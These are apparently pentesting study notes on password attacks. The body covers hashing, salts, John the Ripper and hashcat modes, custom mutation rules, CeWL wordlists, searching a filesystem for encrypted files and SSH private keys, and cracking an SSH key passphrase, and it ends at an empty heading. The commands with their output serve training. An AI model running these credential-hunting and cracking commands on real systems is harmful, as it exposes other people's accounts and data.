- [Password Attacks](#password-attacks)
  - [Introduction](#introduction)
    - [Password Cracking](#password-cracking)
      - [Rainbow Tables](#rainbow-tables)
      - [Brute-force Attack](#brute-force-attack)
      - [Dictionary Attack](#dictionary-attack)
    - [John The Ripper](#john-the-ripper)
      - [Modes](#modes)
        - [Single Crack](#single-crack)
        - [Wordlist](#wordlist)
        - [Incremental](#incremental)
      - [Identifying Hash Formats](#identifying-hash-formats)
      - [Cracking Files](#cracking-files)
    - [Hashcat](#hashcat)
      - [Hash Types](#hash-types)
      - [Attack Modes](#attack-modes)
      - [Dictionary Attack](#dictionary-attack-1)
      - [Mask Attack](#mask-attack)
  - [Cracking Techniques](#cracking-techniques)
    - [Writing Custom Wordlists and Rules](#writing-custom-wordlists-and-rules)
      - [Generating Wordlists using CeWL](#generating-wordlists-using-cewl)
    - [Cracking Protected Files](#cracking-protected-files)
      - [Hunting for Encrypted Files](#hunting-for-encrypted-files)
      - [Hunting for SSH Keys](#hunting-for-ssh-keys)
        - [Cracking encrypted SSH Keys](#cracking-encrypted-ssh-keys)
      - [Cracking password-protected Documents](#cracking-password-protected-documents)
    - [Cracking Protected Archives](#cracking-protected-archives)
      - [Cracking ZIP Files](#cracking-zip-files)
      - [Cracking OpenSSL encrypted GZIP Files](#cracking-openssl-encrypted-gzip-files)
      - [Cracking BitLocker-encrpyted Drives](#cracking-bitlocker-encrpyted-drives)
        - [Mounting BitLocker-encrypted Drives in Windows](#mounting-bitlocker-encrypted-drives-in-windows)
        - [Mounting BitLocker-encrypted Drives in Linux (_or macOS_)](#mounting-bitlocker-encrypted-drives-in-linux-or-macos)
  - [Remote Password Attacks](#remote-password-attacks)
    - [WinRM](#winrm)
      - [NetExec](#netexec)
        - [Installing](#installing)
        - [Menu Options](#menu-options)
        - [Protocol-Specific Help](#protocol-specific-help)
        - [Usage](#usage)
        - [Example](#example)
      - [Evil-WinRM](#evil-winrm)
        - [Installing](#installing-1)
        - [Usage](#usage-1)
        - [Example](#example-1)
    - [SSH](#ssh)
      - [Hydra](#hydra)
    - [RDP](#rdp)
      - [Hydra](#hydra-1)
      - [xFreeRDP](#xfreerdp)
        - [Usage](#usage-2)
        - [Example](#example-2)
    - [SMB](#smb)
      - [Hydra](#hydra-2)
        - [Example](#example-3)
        - [Error](#error)
      - [Metasploit](#metasploit)
      - [NetExec](#netexec-1)
      - [SMB](#smb-1)
    - [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
      - [Password Spraying](#password-spraying)
      - [Credential Stuffing](#credential-stuffing)
      - [Default Credentials](#default-credentials)
  - [Windows Systems](#windows-systems)
    - [Authentication Process](#authentication-process)
      - [LSASS](#lsass)
      - [SAM Database](#sam-database)
      - [Credential Manager](#credential-manager)
      - [NTDS](#ntds)
    - [Attacking SAM, SYSTEM, and SECURITY](#attacking-sam-system-and-security)
      - [Registry Hives](#registry-hives)
        - [Using reg.exe to copy Registry Hives](#using-regexe-to-copy-registry-hives)
        - [Creating a Share with smbserver](#creating-a-share-with-smbserver)
        - [Moving Hive Copies to Share](#moving-hive-copies-to-share)
      - [Dumping Hashes with secretsdump](#dumping-hashes-with-secretsdump)
      - [Cracking Hashes with Hashcat](#cracking-hashes-with-hashcat)
        - [Running Hashcat against NT hashes](#running-hashcat-against-nt-hashes)
      - [DCC2 Hashes](#dcc2-hashes)
      - [DPAPI](#dpapi)
      - [Remote Dumping \& LSA Secrets Considerations](#remote-dumping--lsa-secrets-considerations)
        - [Dumping LSA Secrets Remotely](#dumping-lsa-secrets-remotely)
        - [Dumping SAM Remotely](#dumping-sam-remotely)
    - [Attacking LSASS](#attacking-lsass)
      - [Dumping LSASS Process Memory](#dumping-lsass-process-memory)
        - [Task Manager Method](#task-manager-method)
        - [Rundll32.exe \& Comsvcs.dll Method](#rundll32exe--comsvcsdll-method)
      - [Using Pypykatz to extract Credentials](#using-pypykatz-to-extract-credentials)
      - [Cracking the NT Hash with Hashcat](#cracking-the-nt-hash-with-hashcat)
    - [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
      - [Enumerating Credentials with cmdkey](#enumerating-credentials-with-cmdkey)
      - [Extracting Credentials with Mimikatz](#extracting-credentials-with-mimikatz)
    - [Attacking AD and NTDS.dit](#attacking-ad-and-ntdsdit)
      - [Dictionary Attacks against AD Accounts using NetExec](#dictionary-attacks-against-ad-accounts-using-netexec)
        - [Creating a Custom List of Usernames](#creating-a-custom-list-of-usernames)
        - [Enumerating Valid Usernames with Kerbrute](#enumerating-valid-usernames-with-kerbrute)
        - [Launching a Brute-Force Attack with NetExec](#launching-a-brute-force-attack-with-netexec)
        - [Event Logs from the Attack](#event-logs-from-the-attack)
      - [Capturing NTDS.dit](#capturing-ntdsdit)
        - [Connecting to a DC with Evil-WinRm](#connecting-to-a-dc-with-evil-winrm)
        - [Checking Local Group Membership](#checking-local-group-membership)
        - [Checking User Account Privileges including Domain](#checking-user-account-privileges-including-domain)
        - [Creating Shadow Copy of C:](#creating-shadow-copy-of-c)
        - [Copying NTDS.dit from the VSS](#copying-ntdsdit-from-the-vss)
        - [Transferring NTDS.dit to Attack Host](#transferring-ntdsdit-to-attack-host)
        - [Extracting Hashes from NTDS.dit](#extracting-hashes-from-ntdsdit)
        - [A faster Method: Using NetExec to capture NTDS.dit](#a-faster-method-using-netexec-to-capture-ntdsdit)
      - [Cracking Hashes and Gaining Credentials](#cracking-hashes-and-gaining-credentials)
      - [Pass the Hash (PtH) Considerations](#pass-the-hash-pth-considerations)
    - [Credential Hunting](#credential-hunting)
      - [Search-centric](#search-centric)
        - [Key Terms to Search for](#key-terms-to-search-for)
      - [Search Tools](#search-tools)
        - [Windows Search](#windows-search)
        - [LaZagne](#lazagne)
        - [findstr](#findstr)
      - [Additional Considerations](#additional-considerations)
  - [Linux Systems](#linux-systems)
    - [Authentication Process](#authentication-process-1)
      - [Passwd File](#passwd-file)
      - [Shadow File](#shadow-file)
      - [Opasswd](#opasswd)
      - [Cracking Linux Credentials](#cracking-linux-credentials)
    - [Credential Hunting](#credential-hunting-1)
      - [Files](#files)
        - [Searching for Config Files](#searching-for-config-files)
        - [Searching for DBs](#searching-for-dbs)
        - [Searching for Notes](#searching-for-notes)
        - [Searching for Scripts](#searching-for-scripts)
        - [Enumerating Cronjobs](#enumerating-cronjobs)
        - [Enumerating History Files](#enumerating-history-files)
        - [Enumerating Log Files](#enumerating-log-files)
      - [Memory and Cache](#memory-and-cache)
        - [Mimipenguin](#mimipenguin)
        - [LaZagne](#lazagne-1)
        - [Browser Credentials](#browser-credentials)
  - [Extracting Passwords from the Network](#extracting-passwords-from-the-network)

---

# Password Attacks

## Introduction

### Password Cracking

Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into hands of an attacker. Hashing is a mathematical function which transforms an arbitrary number of input bytes into a (_typically_) fixed-size output; common examples of hash functions are MD5, and SHA-256.

```Soccer06!``` example:

```bash
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

Hash functions are designed to work in one direction. This means it should not be possible to figure out what the original password was based on the hash alone. When attackers attempt to do this, it is called password cracking. Common techniques are to use rainbow tables, to perform dictionary attacks, and typically as a last resort, to perform brute-force attacks.

#### Rainbow Tables

... are large pre-compiled maps of input and output values for a given hash function. These can be used to very quickly identify the password it its corresponding hash has already been mapped. Because rainbow tables are such a powerful attack, salting is used. A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed. To maximize impacts, salts should not be reused, e.g. for all passwords in one database. For example, if the salt ```Th1sIsTh3S@lt_``` is prepended to the same password, the MD5 hash would now be as follows:

```bash
d41y@htb[/htb]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum

90a10ba83c04e7996bc53373170b5474  -
```

A salt is not a secret value - when a system goes to check an authentication request, it needs to know what salt was used so that it can check if the password hash matches. For this reason, salts are typically prepended to corresponding hashes. The reason this technique works against rainbow tables is that even if the correct password has been mapped, the combination of salt and password has likely not. To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of just one single byte would mean the 15 billion entries from before would have to be 3.84 trillion.

#### Brute-force Attack

... involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time. Brute-forcing is the only password cracking technique that is 100% effective. That said, it is hardly ever used because of how much time it takes for stronger passwords, and is typically replaced by much more efficient mask attacks.

#### Dictionary Attack

... is one of the most efficient techniques for cracking passwords, especially when operating under time-constraints as pentesters usually do. Rather than attempting every possible combination of chars, a list containing statistically likely passwords is used.

### John The Ripper

... is a well-known pentesting tool used for cracking passwords through various attacks including brute-force and dictionary. The "jumbo" variant has performance optimizations, additional features such as multilingual word lists, and support for 64-bit archs.

#### Modes

##### Single Crack

... is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory, and GECOS values. These strings are run against a large set of rules that apply common string modifications seen in passwords.

Imagine you came across the ```passwd``` file with the following contents:

```bash
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```

Based on the contents of the file, it can be inferred that the victim has the username "r0lf", the real name "Rolf Sebastian", and the home dir ```/home/r0lf```. Single crack mode will use this information to generate candidate passwords and test them against the hash. You can run the attack with the following command:

```bash
d41y@htb[/htb]$ john --single passwd

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[...SNIP...]        (r0lf)     
1g 0:00:00:00 DONE 1/3 (2025-04-10 07:47) 12.50g/s 5400p/s 5400c/s 5400C/s NAITSABESFL0R..rSebastiannaitsabeSr
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

##### Wordlist

... is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax is as follows:

```bash
d41y@htb[/htb]$ john --wordlist=<wordlist_file> <hash_file>
```

The wordlist file (_or files_) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the ```--rules``` argument. These can be applied to generate candidate passwords using transformations such as appending numbers, capitalizing letters and adding special chars.

##### Incremental

... is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model. It is designed to test all char combinations defined by a specific char set, prioritizing more likely passwords based on training data.

This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist, in contrast to wordlist mode. Unlike purely random brute-force attacks, incremental mode uses a statistical model to make educated guesses, resulting in a significantly more efficient approach than naive brute-force attacks.

```bash
d41y@htb[/htb]$ john --incremental <hash_file>
```

By default, John uses predefined incremental modes specified in its config file (```john.conf```), which define character sets and password lengths. You can customize these or define your own to target passwords that use special characters or specific patterns.

```bash
d41y@htb[/htb]$ grep '# Incremental modes' -A 100 /etc/john/john.conf

# Incremental modes

# This is for one-off uses (make your own custom.chr).
# A charset can now also be named directly from command-line, so no config
# entry needed: --incremental=whatever.chr
[Incremental:Custom]
File = $JOHN/custom.chr
MinLen = 0

# The theoretical CharCount is 211, we've got 196.
[Incremental:UTF8]
File = $JOHN/utf8.chr
MinLen = 0
CharCount = 196

# This is CP1252, a super-set of ISO-8859-1.
# The theoretical CharCount is 219, we've got 203.
[Incremental:Latin1]
File = $JOHN/latin1.chr
MinLen = 0
CharCount = 203

[Incremental:ASCII]
File = $JOHN/ascii.chr
MinLen = 0
MaxLen = 13
CharCount = 95

...SNIP...
```

#### Identifying Hash Formats

Sometimes, password hashes may appear in an unknown format, and even John may not be able to identify them with complete certainty. Consider the following hash:

```bash
193069ceb0461e1d40d216e32c79c704
```

One way to get an idea is to consult [John's sample hash documentation](https://openwall.info/wiki/john/sample-hashes), or [this list by PentestMonkey](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats). Both sources list multiple example hashes as well as the corresponding John format. Another option is to use a tool like [hashID](https://github.com/psypanda/hashID), which checks supplied hashes against a built-in list to suggest potential formats. By adding the ```-j``` flag, hashID will, in addition to the hash format, list the corresponding John format.

```bash
d41y@htb[/htb]$ hashid -j 193069ceb0461e1d40d216e32c79c704

Analyzing '193069ceb0461e1d40d216e32c79c704'
[+] MD2 [JtR Format: md2]
[+] MD5 [JtR Format: raw-md5]
[+] MD4 [JtR Format: raw-md4]
[+] Double MD5 
[+] LM [JtR Format: lm]
[+] RIPEMD-128 [JtR Format: ripemd-128]
[+] Haval-128 [JtR Format: haval-128-4]
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [JtR Format: lotus5]
[+] Skype 
[+] Snefru-128 [JtR Format: snefru-128]
[+] NTLM [JtR Format: nt]
[+] Domain Cached Credentials [JtR Format: mscach]
[+] Domain Cached Credentials 2 [JtR Format: mscach2]
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x [JtR Format: radmin]
```

John supports hundreds of hash formats. The ```--format``` argument can be supplied to instruct John which format target hashes have (```john --format=afs [...] <hash_file>```).

#### Cracking Files

It is also possible to crack password-protected or encrypted files with John. Multiple "2john" tools come with John that can be used to process files and produce hashes compatible with John. The generalized syntax for these tools is:

```bash
d41y@htb[/htb]$ <tool> <file_to_crack> > file.hash
```

### Hashcat

The general syntax used to run hashcat is:

```bash
d41y@htb[/htb]$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
# -a for attack mode
# -m to specify hash type
```

#### Hash Types

Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running the following:

```bash
d41y@htb[/htb]$ hashcat --help

...SNIP...

- [ Hash modes ] -

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
    100 | SHA1                                                       | Raw Hash
   1300 | SHA2-224                                                   | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
  10800 | SHA2-384                                                   | Raw Hash
   1700 | SHA2-512                                                   | Raw Hash
  17300 | SHA3-224                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  17500 | SHA3-384                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
   6000 | RIPEMD-160                                                 | Raw Hash
    600 | BLAKE2b-512                                                | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                       | Raw Hash
   5100 | Half MD5                                                   | Raw Hash
  17700 | Keccak-224                                                 | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
  17900 | Keccak-384                                                 | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
  10100 | SipHash                                                    | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
    170 | sha1(utf16le($pass))                                       | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
...SNIP...
```

Alternatively, ```hashid``` can be used to quickly identify the hashcat hash type by specifying the ```-m``` argument.

```bash
d41y@htb[/htb]$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
```

#### Attack Modes

#### Dictionary Attack

```-a 0``` is a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as potential password until the correct one is found or the list is exhausted.

```bash
d41y@htb[/htb]$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

...SNIP...               

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Sat Apr 19 08:58:44 2025 (0 secs)
Time.Estimated...: Sat Apr 19 08:58:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1706.6 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 28672/14344385 (0.20%)
Rejected.........: 0/28672 (0.00%)
Restore.Point....: 27648/14344385 (0.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 010292 -> spongebob9
Hardware.Mon.#1..: Util: 40%

Started: Sat Apr 19 08:58:43 2025
Stopped: Sat Apr 19 08:58:46 2025
```

A wordlist is often not enough to crack a password hash. Rules can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under ```/usr/share/hashcat/rules```.

```bash
d41y@htb[/htb]$ ls -l /usr/share/hashcat/rules

total 2852
-rw-r--r-- 1 root root 309439 Apr 24  2024 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35802 Apr 24  2024 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  20580 Apr 24  2024 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root  64068 Apr 24  2024 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
-rw-r--r-- 1 root root   2027 Apr 24  2024 T0XlC-insert_space_and_special_0_F.rule
-rw-r--r-- 1 root root  34437 Apr 24  2024 T0XlC-insert_top_100_passwords_1_G.rule
-rw-r--r-- 1 root root  34813 Apr 24  2024 T0XlC.rule
-rw-r--r-- 1 root root   1289 Apr 24  2024 T0XlC_3_rule.rule
-rw-r--r-- 1 root root 168700 Apr 24  2024 T0XlC_insert_HTML_entities_0_Z.rule
-rw-r--r-- 1 root root 197418 Apr 24  2024 T0XlCv2.rule
-rw-r--r-- 1 root root    933 Apr 24  2024 best64.rule
-rw-r--r-- 1 root root    754 Apr 24  2024 combinator.rule
-rw-r--r-- 1 root root 200739 Apr 24  2024 d3ad0ne.rule
-rw-r--r-- 1 root root 788063 Apr 24  2024 dive.rule
-rw-r--r-- 1 root root  78068 Apr 24  2024 generated.rule
-rw-r--r-- 1 root root 483425 Apr 24  2024 generated2.rule
drwxr-xr-x 2 root root   4096 Oct 19 15:30 hybrid
-rw-r--r-- 1 root root    298 Apr 24  2024 leetspeak.rule
-rw-r--r-- 1 root root   1280 Apr 24  2024 oscommerce.rule
-rw-r--r-- 1 root root 301161 Apr 24  2024 rockyou-30000.rule
-rw-r--r-- 1 root root   1563 Apr 24  2024 specific.rule
-rw-r--r-- 1 root root     45 Apr 24  2024 toggles1.rule
-rw-r--r-- 1 root root    570 Apr 24  2024 toggles2.rule
-rw-r--r-- 1 root root   3755 Apr 24  2024 toggles3.rule
-rw-r--r-- 1 root root  16040 Apr 24  2024 toggles4.rule
-rw-r--r-- 1 root root  49073 Apr 24  2024 toggles5.rule
-rw-r--r-- 1 root root  55346 Apr 24  2024 unix-ninja-leetspeak.rule
```

To perform a rule-based dictionary attack, use ```-r <ruleset>```:

```bash
d41y@htb[/htb]$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1b0556a75770563578569ae21392630c
Time.Started.....: Sat Apr 19 09:16:35 2025 (0 secs)
Time.Estimated...: Sat Apr 19 09:16:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 13624.4 kH/s (5.40ms) @ Accel:512 Loops:77 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 236544/1104517645 (0.02%)
Rejected.........: 0/236544 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: slimshady -> drousd
Hardware.Mon.#1..: Util: 47%

Started: Sat Apr 19 09:16:35 2025
Stopped: Sat Apr 19 09:16:37 2025
```

#### Mask Attack

```-a 3``` is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if you know that a password is eight chars long, rather than attempting every possible combination, you might define a mask that tests combinations of six letters followed by two nunmbers.

As mask is defined by combining a sequence of symbols, each representing a built-in or custom charset. Hashcat includes several built-in charsets:

| Symbol | Charset |
| ------ | ------- |
| ?l | ```abcdefghijklmnopqrstuvwxyz``` |
| ?u | ```ABCDEFGHIJKLMNOPQRSTUVWXYZ``` |
| ?d | ```0123456789``` |
| ?h | ```0123456789abcdef``` |
| ?H | ```0123456789ABCDEF``` |
| ?s | ```«space»!"#$%&'()*+,-./:;<=>?@[]^_`{``` |
| ?a | ```?l?u?d?s``` |
| ?b | ```0x00 - 0xff``` |

Custom charsets can be defined with the ```-1```, ```-2```, ```-3```, and ```-4``` arguments, then referred to with ```?1```, ```?2```, ```?3```, and ```?4```.

```bash
d41y@htb[/htb]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Sat Apr 19 09:43:02 2025 (4 secs)
Time.Estimated...: Sat Apr 19 09:43:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?u?l?l?l?l?d?s [7]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   101.6 MH/s (9.29ms) @ Accel:512 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 456237056/3920854080 (11.64%)
Rejected.........: 0/456237056 (0.00%)
Restore.Point....: 25600/223080 (11.48%)
Restore.Sub.#1...: Salt:0 Amplifier:5120-6144 Iteration:0-1024
Candidate.Engine.: Device Generator
Candidates.#1....: Uayvf7- -> Dikqn5!
Hardware.Mon.#1..: Util: 98%

Started: Sat Apr 19 09:42:46 2025
Stopped: Sat Apr 19 09:43:08 2025
```

## Cracking Techniques

### Writing Custom Wordlists and Rules

Take a look at a simple example using a password list with only one entry.

```bash
d41y@htb[/htb]$ cat password.list

password
```

You can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define chars, words, and their transformations. The complete syntax is documented in the official [Hashcat rule-based attack documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack), but the examples below are sufficient to understand how Hashcat mutates input words.

| Function | Description |
| -------- | ----------- |
| ```:``` | do nothing |
| ```l``` | lowercase all letters |
| ```u``` | uppercase all letters |
| ```c``` | capitalize the first letter and lowercase others |
| ```sXY``` | replace all instances of X with Y |
| ```$!```  | add the exclamation char at the end```

Each rule is written on a new line and determines how a given word should be transformed. If you write the functions shown above into a file, it may look like this:

```bash
d41y@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

You can use the following command to apply the rules in ```custom.rule``` to each word in ```password.list``` and store the mutated results in another file.

```bash
d41y@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Content looks like this:

```bash
d41y@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

Hashcat and John both come with pre-built rule lists that can be used for password generation and cracking. One of the most effective and widely used rulesets is ```best64.rule```, which applies common transformations that frequently result in successful password guesses. It is important to note that password cracking and the creation of custom wordlists are, in most cases, a guessing game. You can narrow this down and perform more targeted guessing if you have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords haven been leaked and directly obtained.

#### Generating Wordlists using CeWL

You can use a tool called [CeWL](https://github.com/digininja/CeWL) to scan potential words from a company's website and save them in a separate list. You can then combine this list with the desired rules to create a customized password list - one that has a higher probability of containing the correct password for an employee. You can specify some parameters, like the depth to spider (```-d```), the minimum length of the word (```-m```), the storage of the found words in lowercase (```--lowercase```), as well as the file where you want to store the results (```-w```).

```bash
d41y@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
d41y@htb[/htb]$ wc -l inlane.wordlist

326
```

### Cracking Protected Files

#### Hunting for Encrypted Files

Many different extensions correspond to encrypted files -  a useful reference list can be found [here](https://fileinfo.com/filetypes/encoded).

Example command to find commonly encrypted files on a Linux system:

```bash
d41y@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```

#### Hunting for SSH Keys

Certain files, such as SSH keys, do not have standard file extension. In cases like these, it may be possible to identify files by standard content such as header and footer values. For example, SSH private keys always begin with ```-----BEGIN [...SNIP...] PRIVATE KEY-----```. You can use tools like ```grep``` to recursively search the file system for them during post-exploitation.

```bash
d41y@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
```

Some SSH keys are encrypted with a passphrase. With older PEM formats, it was possible to tell if an SSH key is encrypted based on the header, which contains the encryption method in use. Modern SSH keys, however, appear the same whether encrypted or not.

```bash
d41y@htb[/htb]$ cat /home/jsmith/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
<SNIP>
```

One way to tell whether an SSH key is encrypted or not, is to try reading the key with ```ssh-keygen```.

```bash
d41y@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```

As shown below, attempting to read a password-protected SSH key will prompt the user for a passphrase:

```bash
d41y@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa

Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

##### Cracking encrypted SSH Keys

John has many different scripts for extracting hashes from files - which you can then proceed to crack. You can find these scripts on your system using the following command:

```bash
d41y@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
<SNIP>
```

For example, you could use the Python script ```ssh2john.py``` to acquire the corresponding hash for an encrypted SSH key, and then use John to try and crack it.

```bash
d41y@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
d41y@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```

Viewing the resulting hash:

```bash
d41y@htb[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```

#### Cracking password-protected Documents

